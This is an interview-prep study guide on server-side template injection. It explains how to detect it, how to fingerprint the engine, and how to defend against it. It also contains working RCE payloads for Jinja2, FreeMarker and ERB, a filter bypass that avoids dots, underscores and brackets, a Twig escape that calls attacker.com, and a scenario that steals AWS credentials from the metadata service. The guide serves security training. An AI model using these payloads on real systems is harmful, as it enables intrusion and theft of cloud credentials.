---
tags: [interview, web-security, qna, scenario]
difficulty: expert
module: "Interview Prep - Web Security"
topic: "QnA - Web Module 10"
---

# Server-Side Template Injection (SSTI) Interview Guide

## Formal Technical Questions

### Q1: What is Server-Side Template Injection (SSTI), and how does it differ from Cross-Site Scripting (XSS)?
**Answer:**
SSTI occurs when an application unsafely embeds user input directly into a server-side template and then evaluates it. Template engines (like Jinja2, Twig, FreeMarker) are designed to combine static templates with dynamic data to generate web pages or emails. If an attacker can inject template syntax into the payload, the template engine will execute it on the server.
**Difference from XSS:**
- **Execution Context:** XSS is a client-side vulnerability. The malicious script executes in the victim's web browser. SSTI is a server-side vulnerability; the malicious payload executes on the backend server.
- **Impact:** XSS typically leads to session hijacking, defacement, or client-side pivoting. SSTI leads to catastrophic server-side impacts, including Local File Inclusion (LFI), Information Disclosure, and frequently, Remote Code Execution (RCE), compromising the entire underlying infrastructure.
- **Mechanism:** In XSS, the injection targets HTML/JS parsing in the browser (e.g., `<script>`). In SSTI, the injection targets the template engine's expression evaluation syntax (e.g., `{{ payload }}` or `${ payload }`).

### Q2: Describe the standard methodology for detecting and identifying an SSTI vulnerability.
**Answer:**
The methodology involves a systematic process of fuzzing and observing engine behavior.
1. **Detect (Fuzzing):** Inject generic template syntax containing mathematical expressions to see if the server evaluates them. Common fuzzing payloads include: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
2. **Observation:** If the server reflects `49`, the application is evaluating the expression, confirming SSTI.
3. **Identify Engine:** Different engines use different syntax. By systematically testing payloads that are valid in one engine but invalid in others, the specific engine can be identified.
   - Send `{{7*'7'}}`. 
     - If it outputs `49` (7 * 7), it's likely **Twig** (PHP) which converts strings to integers.
     - If it outputs `7777777`, it's likely **Jinja2** (Python) which repeats the string.
     - If it errors out, it might be an engine that strictly prohibits cross-type operations.
   - Send `${7/0}`. If it throws a specific Java error, it might be **FreeMarker** or **Velocity**.
4. **Exploit:** Once the engine is identified, the attacker utilizes engine-specific documentation and known gadget chains to escalate to RCE.

### Q3: Explain how Python's Method Resolution Order (MRO) is abused in Jinja2 SSTI to achieve Remote Code Execution.
**Answer:**
In Python, everything is an object. Jinja2 allows access to these objects and their attributes. An attacker abuses this to traverse Python's object hierarchy to find dangerous modules (like `os` or `subprocess`).
1. **Start with an empty object:** `""` (a string) or `[]` (a list).
2. **Access the class:** `"".__class__` (returns `<class 'str'>`).
3. **Traverse the MRO:** `"".__class__.__mro__` or `"".__class__.__base__`. This walks up the inheritance tree to the root `object` class (`<class 'object'>`).
4. **List Subclasses:** `"".__class__.__mro__[1].__subclasses__()`. This returns a massive list of every single class loaded into the Python environment that inherits from `object`.
5. **Find the Gadget:** The attacker searches this list for a class that can execute commands, such as `subprocess.Popen` or `<class 'os._wrap_close'>` (which has a reference to the `os` module in its globals).
6. **Execute:** Once the index of the target class is found (e.g., index 414), the attacker instantiates it or accesses its methods:
   `{{ "".__class__.__mro__[1].__subclasses__()[414]('id', shell=True, stdout=-1).communicate() }}`

### Q4: What is a Sandbox Escape in the context of SSTI, and how do template engines like Twig attempt to prevent it?
**Answer:**
A sandbox is a security mechanism within a template engine that restricts the template's access to the underlying language's environment. It aims to allow users to write complex templates without being able to execute system commands or access sensitive files.
- **Twig Sandbox:** Twig implements a sandbox policy that restricts which methods, properties, and functions can be called.
- **Sandbox Escape:** Attackers attempt to bypass these restrictions by finding undocumented or poorly secured methods that leak references to objects outside the sandbox.
- **Bypassing Twig:** Older versions of Twig could be bypassed by accessing the `_self` variable, which pointed to the current template object. From there, an attacker could access the `env` object, modify the compiler, and inject PHP code:
  `{{ _self.env.setCache("ftp://attacker.com/shell.php") }}` (simplified example).
  Modern sandbox escapes rely on finding complex gadget chains within the application's specific custom filters or functions that inadvertently expose underlying objects.

## Scenario-Based Questions

### Q1: You are auditing a customized email marketing application. You find that the "Subject Line" field is vulnerable to SSTI. You identify the backend as Java and the engine as FreeMarker. How do you construct an RCE payload?
**Answer:**
FreeMarker is a powerful Java template engine. It has built-in features that, if not explicitly disabled, allow direct instantiation of Java classes.
The most common RCE vector in FreeMarker involves the `freemarker.template.utility.Execute` class or using the `new` built-in.
1. **Payload Construction:** I will use the `new` directive to instantiate the `Execute` class, which allows running OS commands.
   The payload syntax is: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`
2. **Alternative Vector (API Built-in):** If the `new` built-in is restricted but `api` is enabled, I can traverse the object graph.
   `${object?api.class.protectionDomain.classLoader.loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")}`
3. **Execution:** I inject this into the Subject Line. When the application renders the email, FreeMarker evaluates the expression, the Java Runtime executes the `id` command, and the output is injected into the subject of the sent email.

### Q2: You find a Jinja2 SSTI vulnerability on a highly secured environment. `{{7*7}}` works. However, `.` (dot), `_` (underscore), and `[` (bracket) characters are blocked by a strict WAF. How do you bypass this to achieve RCE?
**Answer:**
This is a complex WAF bypass scenario requiring alternative syntax to traverse the object tree without using the standard `.` or `_` characters.
1. **Bypassing Underscores:** Jinja2 allows accessing attributes via the `attr()` filter. `__class__` becomes `"class"|attr()`. However, we still need the underscores in the string. I can construct underscores dynamically using the `request` object (if available) or by slicing existing strings. Alternatively, hex encoding `\x5f\x5fclass\x5f\x5f`.
2. **Bypassing Dots:** Instead of `object.property`, I use the `|attr()` filter. `"".__class__` becomes `""|attr("__class__")`.
3. **Bypassing Brackets:** To access array indices (like `subclasses()[400]`), I cannot use `[400]`. Instead, I can use the `pop()` method or utilize Jinja2 loops.
   ```jinja2
   {% for c in ""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")() %}
     {% if c|string == "<class 'subprocess.Popen'>" %}
       {{ c("id", shell=True, stdout=-1)|attr("communicate")() }}
     {% endif %}
   {% endfor %}
   ```
   This loop iterates through all subclasses, checks their string representation, and executes the command when it finds `subprocess.Popen`, completely avoiding brackets, dots, and literal underscores in property names.

## Deep-Dive Defensive Questions

### Q1: As an application security architect, you are guiding developers on choosing a template engine for a new Node.js project. How do you mitigate SSTI at the architectural level?
**Answer:**
The most robust architectural defense is to use **Logic-less Template Engines**.
- **The Concept:** Engines like **Mustache** or **Handlebars** (in its strict configuration) strictly separate logic from presentation. They do not allow the execution of arbitrary code or complex expressions within the template itself. They only allow simple variable replacement and basic looping/branching constructs based on data provided explicitly by the backend.
- **Why it works:** If the template engine inherently lacks the capability to evaluate complex logic or access the underlying runtime environment (like the `process` object in Node.js), an attacker injecting `{{ payload }}` can only ever output a string, completely eliminating the possibility of RCE.
- **Fallback for complex logic:** If complex logic is needed, it must be executed in the backend controller, and the *result* of that logic passed as a simple variable to the template.

### Q2: A development team using Jinja2 argues they are secure because they don't allow users to upload template files. They only allow users to customize their "Display Name," which is rendered as `template.render(name=user_input)`. Are they secure?
**Answer:**
Yes, in this specific configuration, they are generally secure from SSTI.
- **The distinction:** SSTI occurs when user input is concatenated directly into the *template string itself* before rendering.
  - **Vulnerable:** `template = Template("Hello " + user_input); template.render()` (If user_input is `{{7*7}}`, it evaluates).
  - **Secure:** `template = Template("Hello {{ name }}"); template.render(name=user_input)`
- **Mechanism:** In the secure example, the template engine parses the template structure first. It recognizes `{{ name }}` as a variable placeholder. When `render()` is called, it treats `user_input` purely as data to populate that placeholder. Even if `user_input` contains `{{7*7}}`, the engine will render it literally as the string `"{{7*7}}"`, because the parsing phase has already completed.

## Real-World Attack Scenario

### SSTI to Cloud Account Compromise via Ruby ERB
A SaaS platform allows users to generate PDF reports. The users can customize the report header using a text area. The backend uses Ruby's ERB (Embedded Ruby) template engine to render the HTML before converting it to PDF.

1. **Reconnaissance:** The attacker inputs `<%= 7*7 %>` into the header field, generates the PDF, and observes `49` in the output. ERB SSTI is confirmed.
2. **Exploitation (RCE):** ERB allows execution of pure Ruby code. The attacker injects a system command payload: `<%= system('id') %>`. The PDF generation hangs or fails because `system` outputs to stdout, not to the template buffer.
3. **Refining the Payload:** The attacker uses backticks or `%x{}` to capture the output and inject it into the template: `<%= \`id\` %>`. The resulting PDF displays `uid=1000(app) gid=1000(app)`.
4. **Pivoting to the Cloud:** Knowing the application is hosted on AWS, the attacker leverages the RCE to query the EC2 metadata service.
   Payload: `<%= \`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/production-web-role\` %>`
5. **Impact:** The generated PDF contains the `AccessKeyId`, `SecretAccessKey`, and `Token` for the AWS IAM role. The attacker extracts these credentials, configures their local AWS CLI, and gains full access to the production cloud environment.

```text
  [ Attacker ] ---> Input: <%= `curl 169.254.169.254/...` %> ---> [ Web Application ]
                                                                        |
                                                                  [ ERB Engine ]
                                                                        |
                                                          Executes curl via OS Shell
                                                                        |
                                                          <-- AWS Credentials Returned --
                                                                        |
  [ Attacker ] <--- Output: PDF Document Containing Keys <----------------|
```

## Chaining Opportunities
- Chaining with **SSRF** (via code execution) to bypass external firewalls and scan internal networks.
- Chaining with **Reverse Shells** to establish persistent C2 (Command and Control) communication.
- Chaining with **Privilege Escalation** by using the RCE to hunt for internal passwords or kernel exploits to gain `root`.

## Related Notes
- [[08 - Command Injection]]
- [[21 - Cloud Metadata Exploitation]]
- [[27 - WAF Evasion Techniques]]
